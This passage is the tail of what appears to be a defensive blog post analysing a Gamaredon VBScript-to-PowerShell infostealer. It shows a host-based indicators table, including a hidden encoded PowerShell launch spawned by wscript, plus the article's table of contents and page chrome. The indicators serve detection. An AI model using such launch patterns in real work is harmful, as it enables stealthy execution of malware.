+<tbody><tr>
+<td><code>%TEMP%\ricebG3</code></td>
+<td>Dropped VBScript file (No extension)</td>
+</tr>
+<tr>
+<td><code>wscript.exe //e:vbscript //b</code></td>
+<td>Process execution argument pattern</td>
+</tr>
+<tr>
+<td><code>powershell.exe -nol -nop -enc</code></td>
+<td>Spawning from wscript.exe (Hidden window)</td>
+</tr>
+<tr>
+<td><code>HKEY_CURRENT_USER\Console\WindowsResponby</code></td>
+<td>Registry key queried for persistence&#x2F;config</td>
+</tr>
+</tbody></table>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Gamaredon/">Gamaredon</a><a class="post-meta__tags" href="/tags/VBScript/">VBScript</a><a class="post-meta__tags" href="/tags/infostealer/">infostealer</a></div></div><div class="post-reward" style="margin-top: 20px;"><div style="display: flex; justify-content: center;"><a class="custom-reward-btn" href="https://paypal.me/abishg24" target="_blank"><i class="fab fa-paypal"></i><span>Support Me</span></a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/HolyCat/" title="Holycat"><img class="cover" src="/HolyCat/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Holycat</div></div><div class="info-2"><div class="info-item-1">A deep dive into HolyCat Ransomware, a Rust binary that encrypts user files with the .HC extension. The analysis uncovers its reliance on Discord for key exfiltration and dissects the cryptographic routine used to destroy victim data.</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info-name">Profzzor</div><div class="author-info-description">Defensive</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://paypal.me/abishg24"><i class="fab fa-paypal"></i><span>Support Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/profzzor" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://x.com/Profzzr" target="_blank" title="X"><i class="fab fa-x-twitter"></i></a><a class="social-icon" href="https://youtube.com/@Profzzor" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a><a class="social-icon" href="https://twitch.tv/profzzor" target="_blank" title="Twitch"><i class="fab fa-twitch"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I am currently seeking new job opportunities. If you know of any roles that align with my skills and experience, please feel free to connect. Thank you for your support.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Executive-Summary"><span class="toc-text">1. Executive Summary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Technical-Analysis"><span class="toc-text">2. Technical Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-Stage-1-HTA-Dropper"><span class="toc-text">2.1 Stage 1: HTA Dropper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Overview"><span class="toc-text">File Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Entry-Point-and-Command-Construction"><span class="toc-text">A. Entry Point and Command Construction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-Payload-Decoding"><span class="toc-text">B. Payload Decoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-Binary-to-Text-Converter"><span class="toc-text">C.  Binary-to-Text Converter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-File-Dropper"><span class="toc-text">D. File Dropper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#E-Execution"><span class="toc-text">E. Execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Stage-2-VBScript-Downloader-ricebG3"><span class="toc-text">2.2 Stage 2: VBScript Downloader (ricebG3)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Overview-1"><span class="toc-text">File Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Victim-Fingerprinting"><span class="toc-text">A. Victim Fingerprinting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-C2-Communication-User-Agent-Construction"><span class="toc-text">B. C2 Communication &amp; User-Agent Construction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-C2-Infrastructure-Redundancy"><span class="toc-text">C. C2 Infrastructure &amp; Redundancy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-Payload-Download-Fileless-Execution"><span class="toc-text">D. Payload Download &amp; Fileless Execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-C2-Network-Analysis-Verification"><span class="toc-text">2.3 C2 Network Analysis &amp; Verification</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Traffic-Characteristics"><span class="toc-text">A. Traffic Characteristics</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-Analysis-of-Network-Indicators"><span class="toc-text">B. Analysis of Network Indicators</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-Manual-Payload-Retrieval-Verification"><span class="toc-text">C. Manual Payload Retrieval (Verification)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-Payload-Decoding-Routine"><span class="toc-text">D. Payload Decoding Routine</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-Stage-3-VBScript-to-PowerShell-Handoff"><span class="toc-text">2.4 Stage 3: VBScript to PowerShell Handoff</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Overview-2"><span class="toc-text">File Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Obfuscation-Technique-ASCII-Mapping"><span class="toc-text">A. Obfuscation Technique: ASCII Mapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-Command-Reconstruction"><span class="toc-text">B. Command Reconstruction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-Execution-Mechanism"><span class="toc-text">C. Execution Mechanism</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-Dynamic-Validation"><span class="toc-text">D. Dynamic Validation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-Stage-4-PowerShell-Info-Stealer"><span class="toc-text">2.5 Stage 4: PowerShell Info-Stealer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Overview-3"><span class="toc-text">File Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Data-Collection-Capabilities"><span class="toc-text">A. Data Collection Capabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-C2-Infrastructure-Tunneling-Service-Abuse"><span class="toc-text">B. C2 Infrastructure: Tunneling Service Abuse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-Data-Exfiltration-Method"><span class="toc-text">C. Data Exfiltration Method</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Conclusion"><span class="toc-text">3. Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Appendix-A-Indicators-of-Compromise-IOCs"><span class="toc-text">Appendix A: Indicators of Compromise (IOCs)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#A-1-File-Hashes-SHA256"><span class="toc-text">A.1 File Hashes (SHA256)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-2-Network-Indicators-C2-Infrastructure"><span class="toc-text">A.2 Network Indicators (C2 &amp; Infrastructure)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-3-Host-Based-Indicators"><span class="toc-text">A.3 Host-Based Indicators</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Gamaredon/" title="Gamaredon"><img src="/Gamaredon/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Gamaredon"/></a><div class="content"><a class="title" href="/Gamaredon/" title="Gamaredon">Gamaredon</a><time datetime="2025-12-10T00:00:00.000Z" title="Created 2025-12-10 00:00:00">2025-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/HolyCat/" title="Holycat"><img src="/HolyCat/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Holycat"/></a><div class="content"><a class="title" href="/HolyCat/" title="Holycat">Holycat</a><time datetime="2025-12-02T00:00:00.000Z" title="Created 2025-12-02 00:00:00">2025-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/the-payload/" title="The Payload"><img src="/the-payload/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="The Payload"/></a><div class="content"><a class="title" href="/the-payload/" title="The Payload">The Payload</a><time datetime="2025-09-26T00:00:00.000Z" title="Created 2025-09-26 00:00:00">2025-09-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Profzzor</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
